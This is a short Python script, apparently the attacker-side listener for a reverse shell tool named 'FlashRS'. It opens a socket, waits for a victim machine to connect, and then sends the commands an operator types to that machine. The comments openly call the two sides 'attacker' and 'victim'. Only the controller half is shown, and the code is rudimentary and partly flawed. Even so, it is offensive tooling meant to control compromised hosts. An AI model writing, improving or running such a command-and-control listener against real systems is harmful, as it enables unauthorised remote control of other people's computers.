# Import Socket Module to listen for incoming Connections to Localhost:80
import socket
from termcolor import colored


def main(listening_port):
    print('This program will setup a Listener at the following port: {0}'.format(listening_port))

    # Create Socket Object
    client = socket.socket()
    client.bind(('localhost', listening_port))

    # Set client into Listening mode and listen for incoming connections
    client.listen(10)

    print(colored('Connecting...', 'blue'))
    c, addr = client.accept()
    print(colored('Connected!', 'green'))

    # Tell Attacker, Connection was received
    print(colored('------------------Successfully received connections from {0}-----'.format(addr), 'green'))
    print(colored('------------------Reverse Shell Setup was successful.-------------------------', 'green'))

    # While Loop to stay connected until Error occurs and send commands to victim machine
    while True:
        try:
            # Take command input from attacker
            command = input('FlashRS > ')
            c.send(command.encode('UTF-8'))
        except KeyboardInterrupt:
            print('Program forcefully closed.')
        except FileNotFoundError:
            print('Unknown Command...')
